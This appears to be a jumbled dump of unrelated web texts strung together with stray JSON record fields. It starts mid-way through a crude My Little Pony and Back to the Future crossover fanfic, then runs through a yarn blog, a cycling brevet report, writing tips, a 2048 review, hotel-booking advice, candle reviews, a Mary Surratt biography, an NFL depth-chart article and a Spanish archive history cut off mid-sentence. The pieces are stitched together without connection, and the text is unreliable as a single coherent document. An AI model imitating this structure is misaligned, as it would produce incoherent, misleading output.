\"Pinkie Pie!\" \"Twilight?\" Pinkie responded. \"Is that you?\" \"What the hell are you doing? What have you done? What's going on here?!\" \"No time to talk, Twilight! All I'll say is, that MichaelXX2 character is about to get a run for his money!\" And with that, she disappeared into the rip. The hole closed slowly and the roar died down. She was gone.\n\"Doc, are you telling me you built a time machine... out of a DeLorean?\" \"Yes!\" Doc Brown said to Marty. \"The way I see it, if you're gonna make a time machine out of a car, why not do it with some-\" The roaring of a thousand soldiers interrupted Doc as a huge technicolored rip tore through the middle of the Twin Pine Mall parking lot. \"Holy shit! What the hell is that?\" Marty said. \"Great Scott! What the hell is going on?\" Pinkie Pie jumped out of the rip, completely untouched. The Breaker gave a sigh, and the rip closed up behind her. Suddenly, Marty McFly and Doc Brown were looking at a pink-colored pony with huge eyes, staring right at them. \"Wait, this isn't... damn it! You're Marty and Doc, aren't you?\" Pinkie asked. \"Uh... uhh...\" Doc replied. \"I must have typed in the wrong code... actually, while I'm here...\" Pinkie ran towards the van. \"Wait, Doc, what the hell is going on? Why is there a... My Little Pony standing right here, or whatever the fuck she is?\" Marty said, breathlessly. \"I don't know,\" Doc replied. \"I have a feeling we did something incredibly stupid with the time machine in the future, causing a major rip in time and space that could be growing bigger by the second!\"\nPinkie Pie grabbed the case of Plutonium, threw it in the DeLorean, and mounted The Breaker on the dashboard. Doc ran towards the car, shocked. \"Wait, what the hell are you-\" The door slammed in front of his face and the pony was off. From a distance, Doc could see rainbows shooting out of the car. Moments later, a rip in time and space appeared directly in front of the car, and the car traveled into it. The rip disappeared shortly after that. \"Amazing! Incredible! That device, that the pony was holding! It's absolutely baffling! She probably came from her world into ours with the intention of stealing the DeLorean! Wait... stealing the DeLorean- damn.... damn damn damn! I work all my life and spend my entire family fortune on this... this blasted car, only to have it stolen by a pink pony?!\" Doc exclaimed. Marty couldn't believe his eyes, and came to the conclusion that he had dreamed every bit of what he had just seen.\nPinkie Pie entered the dimension human beings live in. She landed in a desolate field somewhere in Springfield, Ohio. It was July 24, 2011. She knew the fic was posted to Equestria Daily on June 5, 2011, meaning that it had to have been written some time before that. She guessed June 4, entered these numbers into the Time Circuits, and eased the DeLorean to 88 miles per hour. In the blink of an eye, the car disappeared in a cloud of smoke. A month and 20 days earlier, a man named Michael Brewer was working on a fanfic called \"A Night to Forget.\" He sat at his computer staring at Microsoft Word at 4 in the morning. He was almost done. Right when he was about to kill Fluttershy with a funnel, he heard an explosion ring out from the yard. He went to the door of his apartment to see what all the noise was about, only to immediately be trampled by a pink pony, carrying some sort of silver box with her.\n\"What the hell... Pinkie Pie? Oh boy, I must really be high off my ass to be seeing Pinkie Pie at 4 in the-\" \"Shut up, you,\" Pinkie Pie interrupted. \"You think you're all funny, writing all that shit about me and my friends, hmm?\" \"Well, I, uh...\" Michael retorted. \"Yeah, you'd better stammer. Because I'm about to love and tolerate the SHIT out of you.\" \"Oh my God, yes! Yes!!\" Michael screamed. Just as soon as he did, Pinkie threw him against the wall and smacked his face, knocking him out. She ran over to his computer, the two monitors shining brilliantly in the darkness. On the left monitor, a Word document was open that had A Night to Forget on it.\nWithout a word, Pinkie Pie aimed The Breaker at the screen. She pressed the button on the machine and immediately it let out a horrifying noise. A rip in time and space formed right on Michael's desk. The technicolored rip swirled and howled in the darkness. Pinkie, without hesitation, jumped through the rip. As she disappeared, the rip did as well. It closed up and left Michael in his apartment alone. The DeLorean was still parked in the parking lot.\nPinkie stumbled through the rip and found herself on the streets of Southampton. To her left, she saw RMS Titanic towering above her. The port side was facing a large crowd of carefree ponies, all talking and laughing as they boarded. She ran to the ticket office, hoping to not run into her other self.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 23168}

{"text": "Today I organized my yarn. Nothing major, I just took it out of the big plastic bin and sorted it into an empty cupboard.\nIt was quite nice to become reaquainted with my stash - it has been a while since I opened my yarn bin as I have been very focused on my cozy stripe blanket and not searching out new yarn for a new project.\nI was also happy and relieved to see that my stash is really not that big. Believe me when I say that this was not always the case.\nAnd knowing that I have plans for all the yarn I have on hand makes me feel quite smug. I have truly shown incredible restraint in the last while and have only bought what I have plans for (rather than, \"that looks pretty, I'll take 3 balls.\") I applaud myself, goodness knows this has not been easy at times. Even today, I was notified that Bernat Handicrafter Cotton was on sale for $1.00 a ball at a local store and I resisted the urge to hop in the car (with my daughter, who was home from school with an eye infection) to go and get some. Like I said, incredible restraint. Take that, yarn hoarding tendencies.\nAnd while I'm at it, I'll tell you what projects I have planned for the yarn you see here.\nThe red and white yarn is for my v-stitch blanket which I introduced here. My plan is to crochet until all this yarn is gone, so this is a long term project, which will result in a very large blanket.\nThe turquoise yarn is for a shawl that I want to make for myself. I am trying to decide between three different patterns. And I am trying to decide if I am a shawl person.\nThe wicker basket is full of cotton. This is for making mandalas, toys, baskets etc. The same is true for the large balls of cotton in the middle of the shelf.\nThe black yarn is for the edging of my shawl (see above) and also for a scarf for Steve. I intended to make him a scarf as a gift for this Christmas, but that never happened. Good thing we have Christmas and winter every year.\nThe pink and purple basket is again full of cotton and, along with the cones, is on hand for making toys, baskets, mandalas.\nThe orange and yellow basket holds leftover yarn from my Garden Patch Granny Afghan. I'm not 100% sure what I'll use this for, but these leftovers have come in handy when I wanted to make this pillow and this bunting so I am sure I will find something to make with it.\nToday has been a good day, as any day spent with yarn is.\nFabulous! LOVE how much you love to knit/crochet!! Hope your daughter is feeling better and looking forward to seeing your next project!!\nThanks Leslie. Looking at all my yarn makes me excited to start a new project....but I am trying to be good and finish what is already in progress.\nHi Rachel, wow your cupboard looks great and so neatly organized! I wish I had room for one but I use clear bins that are stored in the basement. It feels great when everything is neat in one place. Hope you have fun with your crochet projects.\nHi Julie. I am very excited to have all my yarn visible; it makes dreaming of projects much easier.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 54525}

{"text": "Right on time at 6:00 we started moving. I saw many familiar faces and managed to get in just behind the leading group across the Golden Gate Bridge. At the Camino Alto climb the group stayed mostly together and we continued like that to Fairfax. I was feeling just ok, not great but not bad.\nAgain on the next climb, White Hill, i manage to ride close to a group that would pull me all the way to the bottom of the next climb, the Olema hill. By now I was not feeling that well and I slowed down and just let the group go.\nOn Pt Reyes Station I went to Toby's for an espresso and saw Steffen P and Erick W my Fleche pals earlier this year. Toby's did not have register receipts but the lady hand wrote one for each of us. Caffeinated now it was time to get some water at the public restrooms on the back of the building. As I was getting ready to leave, a group of riders was coming in. Greg B, who would be driving back with me to San Francisco the same evening was there and we left together but at the first tiny incline I just slowed down and felt the early signs of cramps. Ah crap, it is too early for this!\nMaintaing a steady pace without ever pushing, I made it to Valley Ford. This was not a scheduled stop but I needed to get some electrolytes into my system and allow the legs to recover a little. There was a bicycle tourer and we started chatting about his trip and my ride. As I was preparing to leave Andrea and Francisco showed up. We saw a few of riders doing the ride go by and when I was rolling Jesse M and Matthew F passed and I jump on the tandem they were following.\nA little better but not quite there, I rode with them a few miles to the bottom of the Occidental climb. Again I had to slow down to prevent cramps but my pace was not supper slow so I figured I would be OK for the rest of the ride as long as I managed to eat and rest from time to time. I had been drinking plenty of water from the start I was sure the culprit was the wine and beer I drank early on the week.\nNobody passed me on the way to Guernville the next Control. This was an \"open\" ControI meaning a receipt from any retailer in town would do. I chose Safeway as my stop, I like their soup bar, chili with chicken for me today. Greg was also at Safeway and decided he had enough fun for the day riding with the lead group and he would ride with me the rest of the way.\nAfter a thirty minute lunch break we were ready to leave. Sun was out and the temperature was still pleasant. A few miles after getting off Hwy 116/River Road Steffan P, Eric W and Roy R joined us. They were doing the 300k route which had a slightly different route than our 200k. We talked all the way till it was time for us take West Dry Creek Rd. Sun was now much warmer but there was a nice breeze and our pace was not fast.\nThe next Control was at the Dry Creek General Store. Matthew, Jesse and the tandem where there as were Andrea and Francisco. We got something to eat and drink and sat on the porch to eat or stuff. Once again as we were leaving another group of riders was coming in. Willy N, Deb B and many others went straight to the bar next door. We would wait till the end to get a beer. It was hot now.\nWith the first pedal stokes came a very sharp pain on my left knee. This ha also happened right after leaving the Guernville Control. And also happened on the 600k earlier on the year. However after pedaling while standing for a little bit things got better.\nWe followed the route taking the long way to Cloverdale. At Asti Rd I wished I had remember to soak my cycle cap in water, the sun was strong and the temperature had increased considerably. Fortunately Cloverdale was just a few miles away. Entering town we commented we were happy we weren't doing the 300k today. However that last Control was on the other end of town and it we still had to pedal there.\nWhen we got there the same six or so riders we had seen in Dry creek where there, my final control receipt was printed at 3:10pm. We joined other riders on the sidewalk and then slowly but surely they left towards the Best Western Motel. We left last and then meet them at the motel were we sign in the list of finishing riders and turned in the completed brevet cards.\nA beer in hand and a few salty chips I was happy. I got my drop bag and pulled out my towel and toiletries and with Bruce's approval used the shower in the room where the finishing riders checkin was happening. Now with clean clothes I was even happier. It was now a matter of waiting for the wife to come and pick us up. We were going to have dinner at Ruth McGowan's Brewpub in quiet downtown Cloverdale. During this year's Fleche my team had dinner there and I liked their food and as a bonus the beer was OK.\nSaid our goodbyes and let a few riders we were headed to the pub. Just a few minutes after we sat at our table riders started coming in. After having a beer and a burger, at about 8pm, it was my turn to drive us home to San Francisco.\nI'm still feeling rando-burned out, I'm taking more time off from randonneuring and just do some short trail running (4-8 miles) and also mixed terrain riding exploration.\nNice riding with you for a while on this brevet. Sorry you are feeling burned out on Randonneuring. If you want some company on a short local mixed-terrain ride, let me know; those are my favorite rides. I crashed on my ride back from Cloverdale (hit a rock in the road near Whites Hill) and now have to take it easy for a while to let my knee heal.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 18282}

To this end, Hodgman has put this video up on Amazon, which is damn funny, and created this magazine ad, which is a parody of this obscure George Plimpton ad for Itellivision from the 80's. The original ad, the fact of the parody and the parody itself are all three quite funny. A little less funny, but more poignant, is this address that Hodgman gave to a literary reading just after 9/11, published on McSweeney's in honor of the fifth anniversary last week.\nBonus: Also from McSweeney's, somewhat surreal new Mac ad ideas.

One of the appeals of TV and comics for me is coming back to the same characters and seeing what they're up to (and how they've changed). In other countries, such as China (and especially Hong Kong), serializing fiction in newspapers is still widespread, and created the cradle which gave birth to novelists such as Jin Yong. In Scotland, Alexander McCall Smith is getting credit for revitalizing serialization in newspapers here in the West. Personally, I'm looking forward to Michael Chabon's \"Jews With Swords\" serial upcoming in The New York Times Magazine. For now content yourselves with Jaime Hernandez' excellent La Maggie La Loca.

Don't Collaborate on anything that you think you can maybe do on your own if you push yourself.\n2.) There is a difference to be elucidated between the Ecclesiastic writer and the Ecstatic writer. This division has to do with the nature of fascination and Ecclesiastics and Ecstatics are cut from all cloths, exist in all classes, and perdure in all history. An Ecstatic is one who believes in the power of fascination to impart some sense of immediacy on the work. The Ecstatic believes that work must fascinate first. The Ecclesiastic is one who looks down his nose at immediacy and fascination. He is more concerned with doctrine and the nature of convention, and believes that the work of its own merit will draw the reader if the reader is worthy of the work. It is better to be an Ecstatic than an Ecclesiastic.\n3.) There is a difference to be elucidated between Commerce and Art. This is a treacherous road to be negotiated by everyone; it is a slim bridge of rotten wood stretched over a chasm of peril at the bottom of which live the ghouls who write Kirk/Picard Slash Fiction. Particularly the ones where Kirk is the top. As if. Picard would totally make Kirk his bitch.\n4.) Being in this for the money is gauche and gross. If you get lucky, realize how lucky you are. Don't act like a dick.\n5.) Never describe yourself to someone you've just met as \"a writer.\" You're only a writer when you're writing: you are the furthest from writing when you're standing in a bar trying to get people to think better of you than you deserve.\n6.) Never write a list of directives for other writers when you're an unknown nobody still trying to get his first novel and first poetry collection published.\n7.) Reports of the Death of the Author have been somewhat premature. It may seem sexy and French and cool enough to help you nail some nubile young grad students to be spending your time [writing doing] the kind of nonsense John Cage perfected in the early Sixties (PSSST! That's over FORTY years ago, hippy!) where \"the reader has to be engaged in the creation of the meaning of the text because even the writer is always already the reader etc etc.\" But in 2006 Language poetry is what old people did before we were born, it's mostly boring, and you aren't cool enough anyway.\n8.) When in doubt: What Would Uncle Ludwig Wittgenstein Do?\n9.) The oft mentioned by me here Ron Silliman has a point when it comes to his School of Quietude vs. Post/Avant division. He's also spent the last twenty years writing a single, long, multi-volume poem. Which, while it's fine, is a little off kilter as far as projects go. So take stuff he says with a grain of salt. School of Quietude doesn't always mean bad just like Post/Avant doesn't always mean good. Sturgeon's law applies to both, it's just that in the School of Quietude's case, way more than the usual 90% of the stuff is crap.\n10.) If you don't read anything other than Poets & Writers magazine, don't write. There are too many like that already. We don't need more in the club.\nKenneth Goldsmith and the Cult of Pretense & Boredom\nRead more about Kenneth Goldsmith and the Cult of Pretense & Boredom\nThe twentieth century began with a question about what art is. Artists like Duchamp, Tzara, Artaud, Beckett and Breton challenged conventional notions and forced audiences to examine a lot of pre-conceived notions about beauty and the value of the aesthetic.

{"text": "Let me be the first to say that I am not a fan of math. In fact, I loathed it during my middle & high school years. But a couple of my friends introduced me to 2048, the newest number game by Gabriele Cirulli.\nThe goal of the game is to add up the even numbers on the 4\u00d74 grid to 2048, without the grid filling up with numbers. Sounds easy right? Nope.\nEach game starts with two low numbered tiles (usually 2 or 4). The only way to form higher numbered tiles is by combining two tiles of the same number. But when you shift one tile in any direction, all of the other tiles move in that direction as well. This game mechanic makes it all the more challenging for players to achieve the goal of 2048.\nBut say you do happen to get the 2048 tile and win the game\u2026it's all over after that, right? WRONG! The beauty of this game is that it challenges players past its namesake. Once you get 2048 and restart the game, your goal now is to make the 4096 tile. Then if you get 4096, double it, and that becomes your new goal. This process goes on for as long as you want it to. The number will only get higher, and the challenge will be even greater. It did take me a while to reach 2048 and I admit that I'm having trouble trying to reach 4096.\nIn closing, I would like to say that 2048 is a great puzzler. I mostly play shooting games, but this is a good break from all of the guns, blood, and over-glorified warfare. I do like how this game continues to challenge players even after they reach their goal, which makes them want to come back and solve the puzzle.\n2048 is available to play for free on its own site and available for free on both the App Store and Google Play Store.\nThis game gets a solid 8 out of 1o.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 10172}
{"text": "Today we have dozens of ways to book hotel. You can make a hotel booking both through the travel agency and directly through the hotel upon the recommendation of your acquaintances or of the Internet. And of course you can make it online.\nYou can find dozens of broker websites on which you can find different variants, compare prices and make the best booking at the most reasonable price.\nAs for me I always make booking on the booking.com website. In my opinion it has the most convenient, simple and neat interface. And of course it's multilingual.\nThis online agency provides a great number of reservation variants, which gives you the opportunity to select and choose the best one at the most reasonable price. So the technology infrastructure is the website's main advantage.\nThe second advantage that has determined my choice is a lot of customer feedback that is usually absolutely true. The website will not allow the hotel owners to falsify feedback.\nMoreover, the website encourages posting feedback and after the trip it reminds you that it's preferable to leave your feedback. Posting feedback can be regarded as your vacation impressions and helps to promote the website. I always advise everybody to pay attention to other people's feedback. Besides, booking.com has a very good service centre that will help you in case you have problems with the hotel.\nThis website gives you a possibility to compare prices through all broker websites. The booking.com company includes other websites, e.g. agoda. It's a mirror site which very often offers prices10-20% less. All the other broker websites offer the same possibilities.\nUsing this resourse you can go to booking.com, read feedback and find a hotel. But if you find lower prices on the other broker you can be confident in making reservation. However do not forget to check it directly with the hotel.\nAs for my personal experience I always made booking through booking.com just due to the lowest rates. But nevertheless it is better to compare all the rates on Hotelscombined website too.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 31846}

{"text": "Our Mistletoe is a festive pine scent with top notes of fir needle and apple. The heart of the fragrance is Siberian pine and berry that's grounded by base notes of fir and patchouli.\nI've made this fragrance for the last 2 years during the holidays to sell and it is snatched up quickly by happy customers. Great cold & hot throw, too!\nThis has been my most popular candle to date. Has a lovely cold throw but an amazingly inviting hot throw. I love it and so do my customers!\nThis is very nice! Sweet and pleasant. Is really nice in the melts and smells awesome in my room sprays. Not just for the holidays.\nI turned this into my It's a Wonderful Life inspired candle called Bedford Falls and I sold out fast! I love this scent, it smells like pine and all things Christmas. My husband loves it too. Definitely recommend and will continue to use it.\nThis has a very pleasant outdoorsy, woodsy scent. Pretty strong, but not overpowering. It is wonderful in hot and cold process soaps and other products. This one is very similar to Blue Spruce, also from CandleScience. My testers and I really like both of them.\nOverpowering smell of pine-scented disinfecting cleaner, or a cheap air freshener.\nJust wish this was phthalate free... it's one of our favorites & most loved scents by family and friends. Great hot and cold throw. Perfect balance of holiday smells. Highly recommend!!\nLoved this!! Great all year round. Cold throw in Soy wax is awesome, same with hot throw.\nThe smell of this candle just makes me HAPPY!! It's one of those that your kids in the future will go \"Remember that wonderful smell in mom's house?!\" Well this is it people!! Let me know what you think!\nDefinitely Christmasy, but I like it enough for year round. A sweet pine, outdoors type scent. Used in cp soap, it sticks well. And the phthalates in this fragrance oil, (or any that CS carries), are in a non-issue to me, once I'd did some reading on the subject.\nSold out fast this fall. I and my customers loved this one. I haven't smelled anything like this from the big candle makers. Smells like Christmas with a hint of pine. I used at 10% with para soy blend ig6006. 10 minutes after lighting my whole downstairs is full of fragrance.\nI love love love this scent but I only gave it 3 stars because of the PHTHALATES:( I am hopeful it will be just as luscious when you reformulate it.\nMade a ton of soap with this and was my best seller for the holidays. I'm not sure Mistletoe even has a scent, but if it did this would be it! Love my wax melts made with it too.\nI used this in cp soap and there was no acceleration or discoloration. It is a very strong scent.\nI LOVE this scent! It's been a bestseller with customers as well.\nit is very strong and sweet. If you didnt know it was called mistletoe you would smell pine with a sweet smell. My husband loved it so much he had me back something for his truck.\nThis scent is STRONG and is my favorite from CS. Some people have found it too strong but I think it's perfect. It reminds me more of a Christmas Tree than the \"Christmas Tree\" scent from CS. Please do not change this one!\nI absolutely LOVE this scent. Christmas candles are my favorite and this is a perfect Christmas scent.\nAmazing scent both hot and cold. I'm so glad I tried this one. Very popular with everyone.\nI like this one better than Merry Mistletoe. It's pretty good.\nI have sampled a LOT of scents and I end up buying bigger quantities of only a few. This scent is fantastic...crisp, clean, wintery. Great cold and hot throw without being overpowering. I have probably sold the most candles of this scent than any other I have had in 18 years.\nPlease, never stop making this scent. It's such a wonderful, sophisticated evergreen scent that my customers can never get enough of!\nThis is absolutely my favorite Christmas Scent, and was one of my top 2 sellers! (The other was Cranberry Marmalade) Everyone would pick it up to smell and couldn't put it down. It has an intriguing scent that is so much better than just a Christmas Tree scent. I will be making extra of this one next year! Use GB464 1 1/4 oz/lb of wax.\nDon't judge this scent out of the bottle. I got this as a free sample. I picked it based on all the reviews. I just made candles and tarts using Eco Soya CB Advance!! Absolutely amazing cold and hot throw. Hands down the best \"pine\" holiday scent. I will be making 16oz candle and taking it to my family's house to burn for our thanksgiving and Christmas dinner. The scent makes me feel warm, cozy and excited about the holidays. Great job candle science... please keep this in stock forever. I will be buying a bigger bottle asap!!!\nBest Scent I have found so far! I brought this scent, along with 4 other Christmas candles to choose from and this one sold out that day! Its my hot seller for the season!\nI Had to make CP soap with this scent. It just smells So good OOB!! It behaved like a dream!! Beautiful swirly soap for Christmas!\nNo discoloration, no acceleration. Perfect.TY!\nI have been selling Mistletoe from another popular retailer and while it was good, I'm so glad I gave this one a try. It blows the other retailer out the water!! I love it! And if you are into reed diffusers, this scent has taken over two rooms! This is a keeper year round!!\nI had started off my holiday candles with Christmas Hearth. Though I liked it, it wasn't the exact scent I was looking for. This scent was it. If you're looking for a warm home for the holidays with strong pine notes, this is it. Your customers will want more, especially when they see how much scent throw it has, both hot and cold! A keeper for sure!\nHappiness in a bottle! New version of this called \"Merry Mistletoe type\" is a sad impostor, choose this!!!\nI use the 464 wax and this is an excellent holiday fragrance that all my clients love.\nWe actually mix this scent with cinnamon stick for a great twist on the scent! Our customers love it!!\nI sold out very quickly on the Mistletoe. The throw with the GB 464 Soy wax is not an over powering scent but a nice and subtle.\nI just purchased this fragrance oil for my holiday candles. It turned out beautifully! The scent is gives off a wonderful balance of pines and fruit....the scent is present, but not too overwhelming. I also noted that I can use this fragrance in bath & body as well! What a plus, because I was planning on making bath bombs to compliment my candles. Kudos to candle science, my one stop candle shop!!!!!!!!\nAuthentic and strong, worthy of any season.\nA brisk and refreshing smell that I do not restrict to the winter. I will definitely reorder.\nI love this mistletoe it is the best out there.\nThis scent is extremely strong and to me is better than yankee brand.\nI had a lot of requests for this one. Used it in IGI 1343 pillars. Wonderful hot and cold throw. Evokes memories of past Christmases. This is a strong scent. You might want to reduce the amount of FO that you normally use for your paraffin candles accordingly.\nUsed it in soy melters. Absolutely wonderful fragrance.\nJust had a craft show, and this scent out sold everything else. I used it with 6006 in candles, and made 50/50 soy/paraffin tarts. I even left with orders for more. Love this sent.\nThis is the best Mistletoe I have found anywhere! Just opening the bottle scents the whole house. I used bayberry dye chips in GB464 soy wax and the result is just amazing! Thanks for another great scent!\nmistletoe is for all year long, not just the holidays!\nMy customers love this scent for this time of year. Another hit Candlescience!\nI needed some Christmas fragrances that would appeal to those who didn't want all fruity and this is a great choice. The scent description is right on.\nI tested several mistletoe scents and this one was a homerun! Super strong cold and hot throw. Great pine scent.

As the whole nation turns against her, she is forced to rely on her reluctant lawyer to uncover the truth and save her life.\nMary Surratt part A\nThe film \"The Conspirator\" is an excellent film and I have been studying up on Mary Surratt ever since then:\nMARY SURRATT\nSurratt House Museum Photograph\nMary Elizabeth Jenkins Surratt was born in May or June of 1823 near Waterloo, Maryland. Her birthplace now lies within the grounds of Andrews Air Force Base, home of Air Force One. In 1840, at age 17, she married 28-year-old John H. Surratt. The couple went to live on lands that John had inherited from his foster parents, the Neales, in what is now a section of Washington known as Congress Heights. John and Mary had three children. Isaac was born on June 2, 1841. Anna was born on January 1, 1843, and John Jr. was born on April 13, 1844.\nMary's children: Isaac, Anna, and John Jr.In 1851 fire destroyed the Surratt home. John Surratt decided not to rebuild the home at that location. He chose to build a combination home/tavern, and the couple bought a farm not far from Mary's place of birth and near where her family still lived. They established a tavern and later a post office. The tavern was in operation by the fall of 1852, and by 1853 the family was living in the newly constructed Surratt House and Tavern. On December 6, 1853, John Surratt Sr. bought the Washington D.C. property on H Street that would later become Mary's ill-fated boardinghouse. The price was $4000. Mr. Surratt was appointed postmaster on October 6, 1854, and the surrounding area was henceforth called Surrattsville, Maryland. When John Sr. died in 1862 John Jr. briefly served as Surrattsville's postmaster. (On May 3, 1865, the Post Office Department changed the town's name to Robeystown, after the postmaster Andrew V. Robey, and subsequently to Clinton on October 10, 1878.)\nOn October 1, 1864, along with her daughter, Anna, Mary moved to the Washington D.C. property previously purchased by her husband. She rented the Surrattsville tavern to a man named John Minchin Lloyd.\nTo make money, Mary started renting rooms in her Washington, D.C. residence located at 541 H Street. (The photo to the left is a Library of Congress photograph of Mary Surratt's boardinghouse taken during the nineteenth century.) During the Civil War, Mary's son, John, became a Confederate spy and messenger. John Jr. met John Wilkes Booth, and early in 1865, Booth became a frequent visitor to the boardinghouse. Other people, later identified as co-conspirators, also frequented the boardinghouse. It is unclear if Mary Surratt knew what all the \"activity\" was about.\nBooth originally planned to kidnap Abraham Lincoln. In connection with that plot some of Booth's co-conspirators hid two Spencer carbines in the joists of an unfinished loft in John Lloyd's leased tavern. Apparently Lloyd had misgivings over the hiding of weapons in the building, but he allowed it to happen.\nOn April 11, 1865, Mrs. Surratt made a trip to Surrattsville. She traveled with Louis J. Weichmann, one of her boarders (pictured to the right). During the trip, they met John Lloyd on the road at Uniontown. According to Lloyd, Mrs. Surratt told him the \"shooting irons\" would be needed soon. This was a reference to the rifles which had been hidden in the tavern by Booth's co-conspirators.\nThree days later, on the day of the assassination, Mrs. Surratt made another trip to Surrattsville. Again Weichmann accompanied her in a hired buggy. This time, according to Lloyd, she delivered Booth's French field glasses and reminded him to ready the weapons hidden at the tavern he leased from her. Lloyd testified Mary \"told me to have those shooting-irons ready that night, there would be some parties who would call for them.\"It was likely that Lloyd, a heavy drinker, was drunk during this conversation with Mary Surratt. At midnight, after the assassination, Booth and David Herold stopped at the tavern to collect these items.\nNowadays the boardinghouse is the Wok and Roll Restaurant (left), and the tavern (pictured below) is the Surratt House Museum. TheSurratt House Museum complex is owned and operated by a government agency, the Maryland-National Capital Park and Planning Commission, Department of Parks and Recreation, Prince George's County, Natural and Historical Resources Division. The volunteerSurratt Society, among many wonderful things, assists with the interpretation of the site. It has been a very productive joint effort between public and private support for over 30 years.\nWithin hours of President Lincoln's assassination detectives arrived at the Surratt boardinghouse. They searched the house and questioned all 13 people they found. On the night of April 17, 1865, officers arrested Mrs. Surratt. She was charged with conspiracy and with aiding the assassins and assisting their escape. The fact that Lewis Powell (alias Paine or Payne), a definite conspirator, had come to her boardinghouse just as she was being arrested didn't help her cause.\nBy Everette Hatcher III, on April 21, 2011 at 7:22 am, under Uncategorized.

{"text": "Cardinals Coaching Up Depth\nTeam has taken players like Demens and Fells to generate back of roster\nKyle Odegard\nLinebacker Kenny Demens (54) and safety Tony Jefferson (22) are among the unheralded players the Cardinals have developed into key roster pieces.\nIt sounds cutthroat, this 'next man up' mantra the Cardinals have adopted, but truthfully, it's hard to succeed in the NFL with any other philosophy.\nInjuries, retirements and linebacker Daryl Washington's season-long suspension have altered the look of the roster quite dramatically in the past several months, the most recent blow coming when Darnell Dockett suffered his season-ending torn ACL.\nCoach Bruce Arians pledged the team would regroup after that one, and the defensive line was back to its run-stuffing ways in the third preseason game on Sunday against the Bengals, even without the Pro Bowl defensive tackle.\nIt's a reality of the league, where the ability to mitigate damage after injuries can heavily influence team results.\nSince Arians and General Manager Steve Keim took over in January of 2013, their goal has been to add depth throughout the roster. Its construction has not been viewed solely through the prism of starting lineups, because attrition is so common that reserves often play an important role.\n\"Injuries are always going to appear, and not necessarily catastrophic injuries,\" pass-rush coaching specialist Tom Pratt said. \"Soft tissue, one week, that sort of thing. These guys, if they make the roster as young backup players, they've got to be ready to step in and play.\"\nWhile some of the league's stars have the natural ability to lace up their cleats and dominate, the backups have a thin margin for error. Most fit best in certain systems, and the Cardinals coaches take pride in squeezing out every last drop of production.\nWide receiver Jaron Brown made the Cardinals as an undrafted free agent last season and worked his way up to the fourth wide receiver role. With the offseason additions of Ted Ginn, John Brown and Walt Powell, he entered training camp fighting for a job, but has developed so well he is a lock to make the roster.\nIn an interview on \"The Big Red Rage\" radio show last week, Keim said Brown \"may be one of the most improved players from year to year I've seen in my NFL career.\"\nDarren Fells, a former professional basketball player, looked like a practice squad candidate at best early in training camp, but the retirement of Jake Ballard opened up the fourth tight end spot on the 53-man roster, and Fells is the favorite to win it. He caught a touchdown pass against the Vikings and bulldozed through a tackler to pick up a first down against Cincinnati.\nInside linebacker Kenny Demens was on the practice squad for the majority of 2013 but started in place of an injured\nKevin Minter on Sunday and finished with four tackles as he vies for the active roster. The regular season role for this trio and other reserves is yet to be determined, but Demens said it's the coaches' mentality of getting the best out of everyone which benefits the entire roster.\n\"They expect everyone to play at the highest level, whether it's the first-string or the third-string,\" Demens said. \"There's no room for error.\"\nPre-snap penalties and missed assignments drive the coaches particularly mad, with the guilty parties regularly drawing the ire of Arians and his assistants for their infraction. The attention to detail rubs off on the players, who aid in the development by being accountable to one another.\n\"The D-line's got a rule where you can't jump offsides or you'll get fined,\" rookie defensive end Ed Stinson said. \"I'm not trying to give away my money.\"\nThere are different levels of roster depth, from the players who primarily contribute on special teams to the more heavily-involved backups.\nFirst-round draft pick Deone Bucannon should one day be the starting strong safety, but for now has found a role at linebacker in nickel situations. Bucannon is a physical player, and while he may not yet be ready for full-time work, defensive coordinator Todd Bowles is taking advantage of his skill-set in a way that won't hurt the overall product.\n\"(The coaching staff) does a great job with two things: They do a good job of challenging young players, working technique, and the other side they do a good job of putting them in a position to succeed,\" Keim said. \"So many times, guys like Todd Bowles, they understand limitations guys struggle with. They cater to their strength and put them in a schematical position where they are not going to fail.\"\nWhen the roster was built up this summer, Arians broke it into two practice groups. One field held the veterans, and the other the inexperienced players. Instead of sitting and watching, it allowed the youngsters the chance to learn on the fly. That way, \"those guys get all those reps and they're not way, way behind when we come to training camp,\" Arians said.\nWith Dockett the latest example, injuries are inevitable. For the coaches, it's not a matter of hoping for good health, but staying proactive in getting the backups ready for action.\n\"You try to maximize the use of your players,\" Pratt said. \"Not everybody has a whole roster full of All-Pro players. Nobody does. It doesn't always matter if you have the best players or the best team. You've got to have the right mixture.\"", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 90912}

Un a\u00f1os despu\u00e9s el archivo volvi\u00f3 a dar servicio al p\u00fablico. Este primero catalogo fue la base para la elaboraci\u00f3n e impresi\u00f3n de 26 gu\u00edas descriptivas, a nivel de expediente por expediente, tanto de los fondos originales (procedentes de la documentaci\u00f3n rescatada de las fundaciones religiosas que tuvieron injerencia en la asistencia social y m\u00e9dica; como de la documentaci\u00f3n de la Direcci\u00f3n de la Beneficencia P\u00fablica y del Consejo Superior de Insalubridad y el Departamento de Salubridad P\u00fablica, todas ellas antecedentes de la Secretar\u00eda de Salubridad y Asistencia), como de los que fueron rescatados posteriormente.\n\nEl 1 de julio de 2005, el Archivo General de la Naci\u00f3n certific\u00f3 que el Archivo Hist\u00f3rico de la Secretar\u00eda de Salud hab\u00eda quedado inscrito en el Registro Nacional de Archivos. A\u00f1os m\u00e1s tarde, el 6 de noviembre de 2012, la Comisi\u00f3n de Homenajes de la Secretar\u00eda de Salud, mediante el Acuerdo 003/2012 de ese \u00f3rgano colegiado, consider\u00f3 procedente imponer el nombre de \"R\u00f3mulo Velasco Ceballos\" al Archivo Hist\u00f3rico de la Secretar\u00eda de Salud.\n\nEdificio \nEl Archivo Hist\u00f3rico de la Secretar\u00eda de Salud est\u00e1 ubicado en una de las calles m\u00e1s antiguas del Centro Hist\u00f3rico de la Ciudad de M\u00e9xico, en la \u00e9poca colonial cada tramo de esta v\u00eda ten\u00eda un nombre, a la parte donde fue construido el Hospital del Divino Salvador le correspondi\u00f3 el de la \"Canoa\", debido al ca\u00f1o de madera o canoa que existi\u00f3 sobre la acequia de esta calle. Tiempo despu\u00e9s el nombre de Donceles prevaleci\u00f3 a 